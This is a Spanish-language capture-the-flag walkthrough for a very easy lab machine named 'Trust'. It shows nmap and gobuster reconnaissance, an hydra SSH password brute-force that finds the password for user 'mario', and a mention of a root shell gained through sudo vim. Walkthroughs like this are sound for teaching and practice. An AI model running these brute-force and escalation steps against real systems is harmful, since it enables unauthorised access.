---
description: '🧠Dificultad: Muy fácil | 🔓22/07/2025'
---

# 🟦 Trust

Empezamos con un reconocimiento con `nmap` que nos muestra la siguiente información:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 13:46 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
```

Vemos qué página se está alojando en la máquina. En el directorio raíz, aparece el default page de apache, por lo que necesito hacer una enumeración de directorios para ver dónde hay información útil.

```bash
gobuster dir -u http://$IPTARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

En `secret.php`, tenemos esta página web:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250722195318.png" alt="" width="453"><figcaption></figcaption></figure></div>

El nombre `Mario` puede ser un nombre de usuario para el `ssh`. Probamos a hacer fuerza bruta con `hydra`:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET
```

```bash
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

Si vemos los permisos como `sudo` encontramos que el binario `/usr/bin/vim`. Este binario lo podemos explotar ejecutando una shell dentro de `vim` que, al correr con privilegios, se abrirá una sesión como `root`:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250722200202.png" alt=""><figcaption></figcaption></figure></div>
